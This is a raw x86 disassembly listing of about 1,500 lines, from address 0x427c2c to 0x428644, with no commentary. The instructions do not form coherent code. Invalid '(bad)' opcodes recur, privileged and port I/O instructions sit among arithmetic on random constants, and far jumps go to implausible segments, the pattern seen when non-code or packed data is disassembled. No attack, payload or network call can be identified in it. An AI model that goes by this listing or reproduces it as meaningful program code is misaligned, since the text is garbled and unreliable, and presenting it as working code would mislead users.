  427c2c:	push   es
  427c2d:	mov    ds:0x5ed46253,al
  427c32:	and    DWORD PTR [ebx],edx
  427c34:	into   
	...
  427c95:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427c9b:	jecxz  0x427c90
  427c9d:	lock xchg edi,eax
  427c9f:	fmul   DWORD PTR ds:0xb8e29885
  427ca5:	fnstcw WORD PTR [ecx+0x70001a8]
  427cab:	add    DWORD PTR [eax],eax
  427cad:	add    BYTE PTR [eax],bl
  427caf:	mov    ds:0x94bf90d4,eax
  427cb4:	push   ebp
  427cb5:	pop    edx
  427cb6:	lahf   
  427cb7:	js     0x427c9c
  427cb9:	(bad)  
  427cba:	pop    eax
  427cbb:	cmp    dl,BYTE PTR [ecx]
  427cbd:	adc    DWORD PTR [ecx],ebp
  427cbf:	icebp  
  427cc0:	ja     0x427cfb
  427cc2:	sub    eax,0xdfe38cb1
  427cc7:	xor    eax,0xaa230182
  427ccc:	test   al,0xcf
  427cce:	xor    bl,dl
  427cd0:	push   es
  427cd1:	outs   dx,DWORD PTR ds:[esi]
  427cd2:	mov    eax,0xfbee874b
  427cd7:	adc    al,0x7f
  427cd9:	push   es
  427cda:	pop    ebp
  427cdb:	jecxz  0x427d19
  427cdd:	dec    BYTE PTR [ebx]
  427cdf:	imul   BYTE PTR [ecx-0x31d8aeb3]
  427ce5:	or     ch,0x84
  427ce8:	cmp    BYTE PTR [ebx],0x2c
  427ceb:	pop    ebp
  427cec:	sub    BYTE PTR [ecx-0x3316bd9e],0xed
  427cf3:	scas   eax,DWORD PTR es:[edi]
  427cf4:	stc    
  427cf5:	out    0x57,al
  427cf7:	or     esp,DWORD PTR [edx+0x2ac19ea]
  427cfd:	adc    cl,dh
  427cff:	sbb    ecx,ebp
  427d01:	inc    edi
  427d02:	ja     0x427d31
  427d04:	sub    BYTE PTR [esp+esi*4-0xfb8040a],bh
  427d0b:	push   ecx
  427d0c:	cld    
  427d0d:	(bad)  
  427d0e:	push   esp
  427d0f:	mov    dh,ch
  427d11:	pusha  
  427d12:	rol    ebx,cl
  427d14:	sar    BYTE PTR [ebp+0x6d],1
  427d17:	(bad)  
  427d18:	sbb    ecx,eax
  427d1a:	inc    esp
  427d1b:	rcr    BYTE PTR [ebp+eiz*2-0x2e],cl
  427d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d20:	push   es
  427d21:	outs   dx,BYTE PTR ds:[esi]
  427d22:	or     al,0x57
  427d24:	fistp  QWORD PTR [ebp+0x6dba71a6]
  427d2a:	in     eax,dx
  427d2b:	push   es
  427d2c:	out    0x94,eax
  427d2e:	mov    fs,edx
  427d30:	sbb    al,0x29
  427d32:	inc    edx
  427d33:	jge    0x427cfe
  427d35:	add    DWORD PTR [ebx],eax
  427d37:	jle    0x427d9b
  427d39:	test   DWORD PTR [eax+0x160c94e2],esp
  427d3f:	sub    ch,BYTE PTR [ebx]
  427d41:	gs iret 
  427d43:	pop    edi
  427d44:	dec    ebp
  427d45:	jmp    0x427d2f
  427d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d48:	(bad)  
  427d49:	outs   dx,DWORD PTR ds:[esi]
  427d4a:	imul   edi,DWORD PTR [eax+0x27ff2c2c],0xffffff80
  427d51:	mov    BYTE PTR [ecx],ch
  427d53:	icebp  
  427d54:	fnstenv [esi+esi*2]
  427d57:	mov    ds:0x68f63dd9,al
  427d5c:	imul   BYTE PTR [eax+0x62]
  427d5f:	outs   dx,BYTE PTR ds:[esi]
  427d60:	sbb    DWORD PTR [ecx-0x6fad24e0],0x70df0da6
  427d6a:	outs   dx,BYTE PTR ds:[esi]
  427d6b:	xchg   ecx,eax
  427d6c:	cmp    al,dl
  427d6e:	out    dx,al
  427d6f:	adc    al,0xfa
  427d71:	mov    ds:0xa39dea73,al
  427d76:	int    0x67
  427d78:	mov    al,0x16
  427d7a:	ins    BYTE PTR es:[edi],dx
  427d7b:	jo     0x427d1d
  427d7d:	cmp    eax,0x29325688
  427d82:	xor    eax,0x44f1df87
  427d87:	pop    edx
  427d88:	or     DWORD PTR [edx-0x2a],edi
  427d8b:	or     eax,0x3e77bcf2
  427d90:	daa    
  427d91:	ins    BYTE PTR es:[edi],dx
  427d92:	js     0x427d90
  427d94:	mov    edi,0xaddcb72c
  427d99:	hlt    
  427d9a:	(bad)  
  427d9c:	push   0xffffffce
  427d9e:	sub    al,0xba
  427da0:	or     edi,DWORD PTR [ecx+0x3ac4608e]
  427da6:	(bad)  
  427da7:	loopne 0x427d36
  427da9:	mov    cl,0x9d
  427dab:	in     eax,0xbb
  427dad:	cmp    BYTE PTR [esi+eiz*1],ch
  427db0:	(bad)  
  427db1:	call   DWORD PTR [eax+0x7a]
  427db4:	xor    al,BYTE PTR [eax]
	...
  427e16:	mov    eax,0x6d3c25f1
  427e1b:	cld    
  427e1c:	mov    ecx,0xf22c23f5
  427e21:	add    BYTE PTR [edx],ah
  427e23:	mov    cl,0x84
  427e25:	(bad)  
  427e26:	shr    BYTE PTR [ecx+0x1070001],0x0
  427e2d:	add    dl,dh
  427e2f:	adc    esi,DWORD PTR [edx+0x1eb62e50]
  427e35:	je     0x427dc3
  427e37:	retf   0x46d0
  427e3a:	in     al,dx
  427e3b:	pusha  
  427e3c:	shl    bh,0xec
  427e3f:	jmp    0x427eac
  427e41:	mov    al,ds:0xfd6d09ed
  427e46:	push   edi
  427e47:	xchg   DWORD PTR [ecx+0x2f],esi
  427e4a:	cmp    ecx,DWORD PTR [eax+0x30]
  427e4d:	(bad)  [ebx]
  427e4f:	inc    ebp
  427e50:	ror    BYTE PTR [eax],cl
  427e52:	jno    0x427e12
  427e54:	sbb    al,0xe1
  427e56:	cli    
  427e57:	xor    DWORD PTR [edi-0x3a],edx
  427e5a:	(bad)  
  427e5b:	outs   dx,BYTE PTR ds:[esi]
  427e5c:	add    ebp,DWORD PTR [ebx+0x8945421]
  427e62:	lods   eax,DWORD PTR ds:[esi]
  427e63:	sub    eax,0xf66e75f5
  427e68:	mov    al,ds:0x5c11d164
  427e6d:	and    al,dh
  427e6f:	add    eax,0xdf00cefc
  427e74:	and    al,0x58
  427e76:	les    edi,FWORD PTR [eax-0x23]
  427e79:	dec    eax
  427e7a:	fld    DWORD PTR [ebp+0x4335192a]
  427e80:	ss pop ds
  427e82:	lods   al,BYTE PTR ds:[esi]
  427e83:	add    al,0xc2
  427e85:	mov    edx,0x9d703808
  427e8a:	int3   
  427e8b:	inc    ecx
  427e8c:	mov    bl,0x94
  427e8e:	ficomp DWORD PTR [esi-0x24]
  427e91:	or     BYTE PTR [ebx-0x63],bh
  427e94:	or     al,0xa0
  427e96:	push   eax
  427e97:	mov    cl,0x1b
  427e99:	retf   
  427e9a:	mov    ds:0x97a242bb,al
  427e9f:	sti    
  427ea0:	fs jle 0x427eb1
  427ea3:	jg     0x427e8e
  427ea5:	ret    0x822
  427ea8:	jle    0x427e7f
  427eaa:	or     al,0xba
  427eac:	data16 jns 0x427f19
  427eaf:	and    al,0xed
  427eb1:	icebp  
  427eb2:	xchg   ebx,eax
  427eb3:	mov    esp,0x3d3d350a
  427eb8:	fadd   st(6),st
  427eba:	ds push 0x2f296cf3
  427ec0:	test   DWORD PTR [ecx],ecx
  427ec2:	not    DWORD PTR [eax+esi*8+0x2c]
  427ec6:	add    al,0xe3
  427ec8:	and    eax,0x37f80d9f
  427ecd:	cmc    
  427ece:	sti    
  427ecf:	inc    ecx
  427ed0:	out    0x66,eax
  427ed2:	mov    edi,DWORD PTR [ecx]
  427ed4:	loop   0x427f45
  427ed6:	hlt    
  427ed7:	mov    WORD PTR [ebp-0x3d],?
  427eda:	inc    esi
  427edb:	test   al,0x50
  427edd:	fiadd  WORD PTR ds:0xc35f3155
  427ee3:	adc    cl,BYTE PTR [edi-0x39]
  427ee6:	sub    bh,BYTE PTR [edi]
  427ee8:	js     0x427ec9
  427eea:	ja     0x427e96
  427eec:	fcmovb st,st(4)
  427eee:	(bad)  
  427eef:	popa   
  427ef0:	sub    dl,BYTE PTR ds:0x8c4e25f8
  427ef6:	ret    
  427ef7:	in     eax,dx
  427ef8:	mov    es:0xf54e4541,al
  427efe:	push   cs
  427eff:	addr16 jge 0x427e83
  427f02:	jnp    0x427ef5
  427f04:	sbb    al,0x4a
  427f06:	aam    0x1c
  427f08:	jge    0x427ed1
  427f0a:	dec    ebx
  427f0b:	mov    ds:0x3624b3e,eax
  427f10:	pop    ds
  427f11:	inc    esp
  427f12:	pop    esi
  427f13:	aad    0x50
  427f15:	push   edi
  427f16:	inc    ebx
  427f17:	inc    edi
  427f18:	mov    edi,0x4cf48048
  427f1d:	lods   eax,DWORD PTR ds:[esi]
  427f1e:	or     eax,ecx
  427f20:	adc    DWORD PTR [ebx],edx
  427f22:	adc    eax,0xe894b29c
  427f27:	(bad)  
  427f28:	iret   
  427f29:	fst    QWORD PTR [esp+ebx*4-0x22]
  427f2d:	sahf   
  427f2e:	push   ecx
  427f2f:	in     eax,dx
  427f30:	xchg   esp,eax
  427f31:	in     al,0x9d
  427f33:	mov    ecx,0x82
	...
  427f94:	add    BYTE PTR [eax],al
  427f96:	mov    cl,0xa7
  427f98:	dec    ebx
  427f99:	das    
  427f9a:	pop    edi
  427f9b:	out    dx,eax
  427f9c:	cmc    
  427f9d:	mov    edi,0x85e029ac
  427fa2:	(bad)  
  427fa3:	push   esp
  427fa4:	sub    dh,dh
  427fa6:	(bad)  
  427fa7:	stos   BYTE PTR es:[edi],al
  427fa8:	add    DWORD PTR [eax],eax
  427faa:	pop    es
  427fab:	add    DWORD PTR [eax],eax
  427fad:	add    al,dl
  427faf:	add    al,0xf6
  427fb1:	sbb    eax,0x8e0e521d
  427fb6:	repz jmp 0x8e1:0xc78b5b9
  427fbe:	dec    eax
  427fbf:	cmp    BYTE PTR [eax+0x718693ed],ah
  427fc5:	sbb    bh,bl
  427fc7:	lock mov bh,0xe9
  427fca:	in     eax,0x5c
  427fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427fcd:	fidivr WORD PTR [edi]
  427fcf:	pusha  
  427fd0:	jnp    0x428002
  427fd2:	dec    esi
  427fd3:	shl    DWORD PTR [edx-0x145c21fc],1
  427fd9:	repnz das 
  427fdb:	xor    esp,0x8c922bef
  427fe1:	cwde   
  427fe2:	ss aam 0xac
  427fe5:	jo     0x427fe8
  427fe7:	dec    esp
  427fe8:	or     eax,0xe9977b12
  427fed:	out    0x1d,eax
  427fef:	cli    
  427ff0:	mov    BYTE PTR [edx],0xe6
  427ff3:	jbe    0x42800b
  427ff5:	nop
  427ff6:	or     cl,BYTE PTR [esi+eiz*2]
  427ff9:	std    
  427ffa:	mov    ebx,0x847ecd0c
  427fff:	sbb    ah,bh
  428001:	(bad)  
  428002:	xor    al,0x3c
  428004:	scas   al,BYTE PTR es:[edi]
  428005:	adc    eax,0x60822873
  42800a:	jne    0x428022
  42800c:	mov    ebp,DWORD PTR [esi]
  42800e:	popa   
  42800f:	sub    DWORD PTR [ecx],esi
  428011:	ffreep st(1)
  428013:	pop    esi
  428014:	mov    dh,0xe9
  428016:	add    eax,0xad752c5c
  42801b:	ret    0xdadc
  42801e:	(bad)  
  42801f:	xchg   esp,eax
  428020:	sbb    al,0x3e
  428022:	out    dx,eax
  428023:	push   esi
  428024:	stos   BYTE PTR es:[edi],al
  428025:	fdivr  DWORD PTR [esi-0x72]
  428028:	mov    esp,0xb001602f
  42802d:	mov    dh,0x1d
  42802f:	xchg   esp,eax
  428030:	gs (bad) 
  428032:	adc    al,0xa8
  428034:	mov    ah,0xa0
  428036:	test   al,0xd5
  428038:	repnz mov dh,0xf3
  42803b:	and    ah,BYTE PTR [ecx+0x6d]
  42803e:	and    BYTE PTR [ebx-0x50],bl
  428041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428042:	jecxz  0x4280b2
  428044:	scas   al,BYTE PTR es:[edi]
  428045:	inc    eax
  428046:	jge    0x42803f
  428048:	push   esi
  428049:	xchg   BYTE PTR [edi+0x64b5ec0c],dl
  42804f:	(bad)  
  428051:	add    BYTE PTR [edx],ah
  428053:	pop    eax
  428054:	lahf   
  428055:	dec    esp
  428056:	dec    edi
  428057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428058:	cli    
  428059:	dec    ecx
  42805a:	pop    esp
  42805b:	repnz sub al,0x89
  42805e:	sbb    cl,0x6f
  428061:	test   al,0x5d
  428063:	xor    BYTE PTR [eax-0x42],ah
  428066:	ret    
  428067:	xchg   DWORD PTR [ebx+0x2f0a3c90],esp
  42806d:	pop    esi
  42806e:	stos   DWORD PTR es:[edi],eax
  42806f:	(bad)  
  428070:	jae    0x428087
  428072:	test   eax,0x1eed2e92
  428077:	push   ds
  428078:	lds    esi,FWORD PTR [edi+0x77]
  42807b:	pop    ds
  42807c:	cmc    
  42807d:	cdq    
  42807e:	je     0x428037
  428080:	dec    ecx
  428081:	loopne 0x428013
  428083:	aaa    
  428084:	ins    DWORD PTR es:[edi],dx
  428085:	push   edx
  428086:	mov    al,0xc6
  428088:	dec    esp
  428089:	add    DWORD PTR [ecx+0x5d],0x67be1612
  428090:	into   
  428091:	mov    ch,0xe
  428093:	xor    eax,0xab496112
  428098:	sar    BYTE PTR [eax+0x7d],0x7d
  42809c:	test   eax,0x6f3bf5b2
  4280a1:	test   DWORD PTR [ecx],esi
  4280a3:	bound  ecx,QWORD PTR [ecx]
  4280a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280a7:	jb     0x428123
  4280a9:	pop    es
  4280aa:	add    eax,0x111686d3
  4280af:	fabs   
  4280b1:	push   ss
  4280b2:	out    dx,al
  4280b3:	mov    esp,0xa7
	...
  428114:	add    BYTE PTR [eax],al
  428116:	fucomip st,st(6)
  428118:	std    
  428119:	dec    esp
  42811a:	std    
  42811b:	pop    edi
  42811c:	(bad)  
  42811d:	(bad)  
  42811e:	cmp    al,0x36
  428120:	cmp    esp,ebp
  428122:	test   BYTE PTR [ebp+0x16],0x6a
  428126:	into   
  428127:	stos   DWORD PTR es:[edi],eax
  428128:	add    DWORD PTR [eax],eax
  42812a:	pop    es
  42812b:	add    DWORD PTR [eax],eax
  42812d:	add    BYTE PTR [edx-0x589aadc0],al
  428133:	xor    edx,DWORD PTR [edx+eiz*1+0x37]
  428137:	call   0x56b2:0x9c61912b
  42813e:	cwde   
  42813f:	popa   
  428140:	cmp    DWORD PTR [eax-0x1c],0xc5c42f23
  428147:	jmp    0x4281c0
  428149:	sbb    eax,0x3f0083bd
  42814e:	aaa    
  42814f:	and    ch,BYTE PTR ds:0x80110368
  428155:	test   ebx,eax
  428157:	jmp    FWORD PTR [ebp+0x497ec74b]
  42815d:	dec    esp
  42815e:	inc    ebp
  42815f:	js     0x42819b
  428161:	scas   al,BYTE PTR es:[edi]
  428162:	inc    esi
  428163:	and    DWORD PTR [esi],esp
  428165:	xchg   esi,eax
  428166:	lock jae 0x4281e1
  428169:	(bad)  
  42816a:	xchg   ecx,eax
  42816b:	jg     0x42813c
  42816d:	add    esi,ebx
  42816f:	leave  
  428170:	out    dx,eax
  428171:	cdq    
  428172:	pop    edx
  428173:	sar    DWORD PTR [eax-0x2],1
  428176:	cs das 
  428178:	jb     0x4281e1
  42817a:	ficomp DWORD PTR [ecx]
  42817c:	(bad)  
  42817e:	inc    edi
  42817f:	mov    esp,0x9b952360
  428184:	fild   DWORD PTR [esi-0x679d395c]
  42818a:	loope  0x428124
  42818c:	jae    0x428139
  42818e:	jmp    0xd2ba516c
  428193:	fs inc ebp
  428195:	push   edi
  428196:	push   ds
  428197:	mov    ds:0x2985b458,eax
  42819c:	enter  0xa074,0x92
  4281a0:	mov    al,0xa4
  4281a2:	inc    ebx
  4281a3:	add    al,0x60
  4281a5:	mov    bh,0x5d
  4281a7:	shl    BYTE PTR [ebx+0x7004805e],cl
  4281ad:	xchg   DWORD PTR [ebp+0x5b],eax
  4281b0:	gs in  eax,0x9b
  4281b3:	lods   eax,DWORD PTR ds:[esi]
  4281b4:	aas    
  4281b5:	jle    0x4281f5
  4281b7:	push   esi
  4281b8:	mov    cl,0x11
  4281ba:	sub    dl,BYTE PTR [edi+edx*1-0x5a]
  4281be:	sbb    eax,0x3c29d0ed
  4281c3:	add    eax,0xd98c6b94
  4281c8:	je     0x42815d
  4281ca:	jae    0x428235
  4281cc:	jo     0x428204
  4281ce:	sti    
  4281cf:	jp     0x4281e1
  4281d1:	and    dl,dh
  4281d3:	mov    al,0x75
  4281d5:	xchg   DWORD PTR [eax],esp
  4281d7:	int    0xa6
  4281d9:	lea    esi,[eax-0x4771f932]
  4281df:	nop
  4281e0:	clc    
  4281e1:	sbb    al,0xde
  4281e3:	adc    al,0xf7
  4281e5:	gs scas eax,DWORD PTR es:[edi]
  4281e7:	stc    
  4281e8:	and    ch,BYTE PTR [esi+edi*2-0x73]
  4281ec:	push   eax
  4281ed:	pcmpgtd mm3,QWORD PTR [eax+0x77cee3e7]
  4281f4:	mov    esi,0x1b08803c
  4281f9:	clc    
  4281fa:	jae    0x4281eb
  4281fc:	inc    edx
  4281fd:	out    0xb7,al
  4281ff:	push   ebx
  428200:	or     al,0xdb
  428202:	adc    eax,0xe5f296ca
  428207:	out    dx,al
  428208:	fdivr  DWORD PTR [esi+0x46]
  42820b:	jle    0x42824f
  42820d:	imul   BYTE PTR [edi-0x9b9139a]
  428213:	(bad)  
  428214:	out    dx,al
  428215:	fmul   QWORD PTR [ebp-0x7893cef]
  42821b:	rcr    DWORD PTR [edx],cl
  42821d:	repnz adc ah,BYTE PTR [ecx+ebp*8]
  428221:	inc    ebp
  428222:	(bad)  
  428223:	gs icebp 
  428225:	lds    ebp,FWORD PTR [edx]
  428227:	sbb    eax,0xc4b8ce6b
  42822c:	imul   edi,DWORD PTR [ecx+0x6f],0xf4d5d04f
  428233:	mov    dl,cl
	...
  428295:	add    bh,al
  428297:	fidiv  WORD PTR [esi]
  428299:	loop   0x4282da
  42829b:	jmp    0x52eb:0x1ad8ffd7
  4282a2:	(bad)  [edi+0x3c]
  4282a5:	iret   
  4282a6:	aad    0xac
  4282a8:	add    DWORD PTR [eax],eax
  4282aa:	pop    es
  4282ab:	add    DWORD PTR [eax],eax
  4282ad:	add    BYTE PTR [eax+0x11],ah
  4282b0:	inc    esi
  4282b1:	ins    DWORD PTR es:[edi],dx
  4282b2:	jg     0x42829e
  4282b4:	(bad)  
  4282b5:	outs   dx,BYTE PTR ds:[esi]
  4282b6:	(bad)  
  4282b7:	fld    DWORD PTR [ebp-0x5e]
  4282ba:	xchg   ecx,eax
  4282bb:	mov    bl,0x9
  4282bd:	sub    edx,DWORD PTR [ecx-0xc]
  4282c0:	nop
  4282c1:	test   eax,0xd87af7b7
  4282c6:	push   edx
  4282c7:	out    dx,al
  4282c8:	fs or  ecx,ecx
  4282cb:	push   0xade3558
  4282d0:	hlt    
  4282d1:	mov    ah,0x7c
  4282d3:	inc    ebx
  4282d4:	movzx  esp,BYTE PTR [edi]
  4282d7:	xlat   BYTE PTR ds:[ebx]
  4282d8:	dec    esi
  4282d9:	rcr    DWORD PTR [ebp-0x3bee59c],0xce
  4282e0:	mov    es,esp
  4282e2:	or     cl,0x76
  4282e5:	inc    edx
  4282e6:	imul   BYTE PTR [edi-0x4a]
  4282e9:	dec    eax
  4282ea:	imul   ebp,DWORD PTR [ecx],0x7f
  4282ed:	arpl   WORD PTR [edx],bp
  4282ef:	xchg   BYTE PTR [esi+0x1688afc],cl
  4282f5:	ins    BYTE PTR es:[edi],dx
  4282f6:	lods   eax,DWORD PTR ds:[esi]
  4282f7:	or     eax,0x828bf99e
  4282fc:	push   edi
  4282fd:	mov    esp,0xf92abd26
  428302:	sbb    BYTE PTR [ecx+ebp*2-0x10247ac9],bh
  428309:	jecxz  0x4282f6
  42830b:	xor    edx,DWORD PTR [edx]
  42830d:	(bad)  
  42830e:	mov    esp,0xf0c3cc3b
  428313:	push   esi
  428314:	and    esp,DWORD PTR [eax]
  428316:	gs stos BYTE PTR es:[edi],al
  428318:	out    dx,al
  428319:	sub    eax,0x9c2009ea
  42831e:	rcl    BYTE PTR [ebx-0x37ea02b3],0xf5
  428325:	mov    al,0x67
  428327:	cdq    
  428328:	jmp    0x42839a
  42832a:	test   eax,0x9bf164c0
  42832f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428330:	in     al,0xa6
  428332:	add    esp,DWORD PTR [edi]
  428334:	idiv   DWORD PTR [eax]
  428336:	lea    esi,[ebp-0x42]
  428339:	cmp    al,0xa0
  42833b:	mov    bh,0x82
  42833d:	sti    
  42833e:	sub    ebp,DWORD PTR [ecx+edx*8]
  428341:	pop    ebp
  428342:	scas   al,BYTE PTR es:[edi]
  428343:	jo     0x428317
  428345:	in     eax,dx
  428346:	lods   al,BYTE PTR ds:[esi]
  428347:	fnsave [esi]
  428349:	xor    dh,BYTE PTR [ecx-0x536e315c]
  42834f:	fs dec eax
  428351:	pop    es
  428352:	daa    
  428353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428354:	add    eax,0x23a5fee7
  428359:	jmp    0x4282f9
  42835b:	xor    al,0x2c
  42835d:	imul   edx,DWORD PTR [eax+0x30a636f8],0x62
  428364:	cmp    al,0x3
  428366:	sub    BYTE PTR [ebp-0x46],ah
  428369:	add    BYTE PTR [edi+esi*4-0x38],cl
  42836d:	gs (bad) 
  42836f:	(bad)
  428372:	or     al,0x34
  428374:	xlat   BYTE PTR ds:[ebx]
  428375:	sar    ch,0xd4
  428378:	xor    ch,BYTE PTR [ebx+0x58]
  42837b:	xchg   esp,eax
  42837c:	xchg   esp,eax
  42837d:	bound  esp,QWORD PTR [edx]
  42837f:	and    ah,bl
  428381:	cmp    bh,ah
  428383:	ret    0x6a4d
  428386:	ins    DWORD PTR es:[edi],dx
  428387:	xchg   BYTE PTR [ebx+0x17],ah
  42838a:	sub    al,0x67
  42838c:	jle    0x428344
  42838e:	in     eax,dx
  42838f:	call   DWORD PTR [edi+ecx*1-0x51]
  428393:	add    DWORD PTR [eax-0x5a],esi
  428396:	lods   eax,DWORD PTR ds:[esi]
  428397:	adc    ebx,DWORD PTR [edi]
  428399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42839a:	dec    ebp
  42839b:	xchg   ebx,eax
  42839c:	arpl   di,si
  42839e:	inc    ecx
  42839f:	or     al,0x16
  4283a1:	lea    edi,[edi]
  4283a3:	cmp    ecx,edi
  4283a5:	mov    BYTE PTR [ebp+eax*8+0x765a5d89],bh
  4283ac:	xchg   ecx,ebp
  4283ae:	dec    edx
  4283af:	adc    eax,0x59ddba9f
  4283b4:	add    BYTE PTR cs:[eax],al
	...
  428413:	add    BYTE PTR [eax],al
  428415:	add    BYTE PTR [esi],cl
  428417:	xchg   esp,eax
  428418:	jg     0x42847d
  42841a:	(bad)  
  42841b:	jmp    0x42843b
  42841d:	std    
  42841e:	push   ebx
  42841f:	int    0x1
  428421:	(bad)  
  428422:	lock pop edi
  428424:	mov    esp,0x1addc07
  428429:	add    BYTE PTR [edi],al
  42842b:	add    DWORD PTR [eax],eax
  42842d:	add    BYTE PTR [esi],cl
  42842f:	mov    WORD PTR [edi+edi*1-0x33],?
  428433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428434:	sub    edi,edi
  428436:	add    ecx,esp
  428438:	setbe  dh
  42843b:	adc    ch,BYTE PTR [edx-0x52]
  42843e:	in     eax,0x6d
  428440:	in     eax,0x7e
  428442:	and    al,0x55
  428444:	add    BYTE PTR [edx],cl
  428446:	es xchg ebx,eax
  428448:	(bad)  
  428449:	(bad)  
  42844a:	push   0x15
  42844c:	adc    al,0x4b
  42844e:	pop    ss
  42844f:	outs   dx,BYTE PTR ds:[esi]
  428450:	cld    
  428451:	clc    
  428452:	lock dec esp
  428454:	xchg   ecx,eax
  428455:	xor    BYTE PTR [ebp+0x2d9d2d31],ah
  42845b:	inc    ebx
  42845c:	xchg   ebp,eax
  42845d:	imul   esp,DWORD PTR [esi],0xfa2d2312
  428463:	mov    al,0x62
  428465:	dec    esi
  428466:	subps  xmm0,XMMWORD PTR [edi-0x65660f00]
  42846d:	aaa    
  42846e:	out    0xe9,al
  428470:	pop    ss
  428471:	lds    esi,FWORD PTR [eax]
  428473:	daa    
  428474:	mov    edi,DWORD PTR [edx]
  428476:	dec    ebx
  428477:	test   DWORD PTR [edx+0x1b],ebx
  42847a:	pop    ds
  42847b:	add    ah,BYTE PTR [edx]
  42847d:	aas    
  42847e:	(bad)  
  42847f:	mov    ecx,DWORD PTR ds:0xea3fad30
  428485:	(bad)  [esi-0x4a1825c2]
  42848b:	jp     0x42850b
  42848d:	and    DWORD PTR [edx-0x29],0x19
  428491:	scas   al,BYTE PTR es:[edi]
  428492:	mov    esi,0xb664e3cc
  428497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428498:	pop    eax
  428499:	icebp  
  42849a:	and    BYTE PTR [ebp-0xcf100c5],bh
  4284a0:	shl    BYTE PTR [ecx-0x9],0x8b
  4284a4:	inc    esi
  4284a5:	jb     0x4284fb
  4284a7:	sbb    eax,0xeae36859
  4284ac:	jg     0x4284bd
  4284ae:	rol    al,1
  4284b0:	nop
  4284b1:	iret   
  4284b2:	adc    esi,edi
  4284b4:	es push ss
  4284b6:	cmp    ah,BYTE PTR [ecx-0x16d13f1d]
  4284bc:	mov    DWORD PTR [esi-0x17],ebx
  4284bf:	mov    ds:0x60b13f27,eax
  4284c4:	retf   0x3cce
  4284c7:	jg     0x428526
  4284c9:	jle    0x4284f3
  4284cb:	lds    esp,FWORD PTR [ebp+ebp*1-0x555d8fb9]
  4284d2:	mov    DWORD PTR [ecx-0x519c12f1],eax
  4284d8:	(bad)  
  4284d9:	out    0xf3,eax
  4284db:	pop    ds
  4284dc:	mov    ch,BYTE PTR [esi+0x6b]
  4284df:	popf   
  4284e0:	rol    BYTE PTR [edx+0x29be398],0x7e
  4284e7:	push   esi
  4284e8:	pop    es
  4284e9:	or     eax,0xef852e47
  4284ee:	mov    ch,0x1e
  4284f0:	out    0x41,eax
  4284f2:	mov    ecx,ebx
  4284f4:	idiv   DWORD PTR [ecx+0x50]
  4284f7:	mov    eax,ds:0x221f3845
  4284fc:	mov    esi,0x73830d2d
  428501:	fadd   QWORD PTR [esi-0x27]
  428504:	mov    BYTE PTR [eax+ebx*2+0x9],0xa2
  428509:	shl    DWORD PTR [ebp-0x64],1
  42850c:	mov    ch,0x8d
  42850e:	xchg   esp,eax
  42850f:	mov    esi,0x829e4b82
  428514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428515:	mov    ds:0x82d435e9,al
  42851a:	bound  edx,QWORD PTR [edx-0x63142430]
  428520:	xor    al,0x40
  428522:	clc    
  428523:	mov    ah,0xb9
  428525:	ds jge 0x428587
  428528:	xchg   ebp,eax
  428529:	je     0x428569
  42852b:	popa   
  42852c:	std    
  42852d:	xchg   edx,eax
  42852e:	fist   WORD PTR [edi+0x5dcd65c1]
  428534:	xor    eax,0x0
	...
  428595:	add    BYTE PTR [ecx-0xa],dl
  428598:	xor    eax,0x5bffb73e
  42859d:	dec    ebp
  42859f:	sar    BYTE PTR [ecx-0x50],cl
  4285a2:	cmc    
  4285a3:	sub    DWORD PTR [edx],0xffffffa2
  4285a6:	jecxz  0x428556
  4285a8:	add    DWORD PTR [eax],eax
  4285aa:	pop    es
  4285ab:	add    DWORD PTR [eax],eax
  4285ad:	add    BYTE PTR [ecx],cl
  4285af:	rol    DWORD PTR [edi-0x6d],cl
  4285b2:	clc    
  4285b3:	add    bl,BYTE PTR [esi+0x73]
  4285b6:	jbe    0x42855b
  4285b8:	xor    ebx,ecx
  4285ba:	popa   
  4285bb:	mov    eax,ds:0x2338e65f
  4285c0:	dec    BYTE PTR [esi+eiz*1-0x12]
  4285c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285c5:	inc    esi
  4285c6:	jmp    0x14cb:0x64960453
  4285cd:	add    DWORD PTR [ebx-0x1f72b4fb],edx
  4285d3:	mov    ebx,0xef739de6
  4285d8:	adc    BYTE PTR [edi-0xd],ch
  4285db:	jl     0x4285d0
  4285dd:	in     eax,dx
  4285de:	adc    esp,DWORD PTR [edx+0x2b]
  4285e1:	fidivr DWORD PTR [eax-0x35]
  4285e4:	adc    DWORD PTR [ebp+0x17c4f28e],ecx
  4285ea:	add    al,0x8c
  4285ec:	mov    eax,0xf4abc37
  4285f1:	push   ebp
  4285f2:	fistp  QWORD PTR [ebx]
  4285f4:	loopne 0x4285c1
  4285f6:	sub    BYTE PTR [eax+ebp*4+0x3b],cl
  4285fa:	sub    al,0x6
  4285fc:	mov    esi,0xb049a0f9
  428601:	push   edx
  428602:	mov    ah,0xc9
  428604:	sbb    al,0x1a
  428606:	enter  0x18a4,0xb2
  42860a:	pop    ecx
  42860b:	repz js 0x4285b6
  42860e:	inc    esp
  42860f:	xchg   edx,eax
  428610:	push   eax
  428611:	sub    dl,BYTE PTR [ebp+0xabf86fb]
  428617:	xor    eax,0x88cc49ac
  42861c:	mov    edx,0xcd2a6ad8
  428621:	sbb    BYTE PTR ds:0x68b8a57f,dl
  428627:	mov    BYTE PTR [eax],ah
  428629:	pop    edi
  42862a:	pop    edi
  42862b:	rol    dl,1
  42862d:	daa    
  42862e:	mov    ch,0xee
  428630:	outs   dx,BYTE PTR ds:[esi]
  428631:	das    
  428632:	fsubr  QWORD PTR [ecx]
  428634:	aad    0xe3
  428636:	xchg   ebp,eax
  428637:	test   eax,0xf4ee045b
  42863c:	xchg   esi,eax
  42863d:	or     eax,0x2952be9a
  428642:	jle    0x428629
  428644:	mov    edi,0xa90f26a1
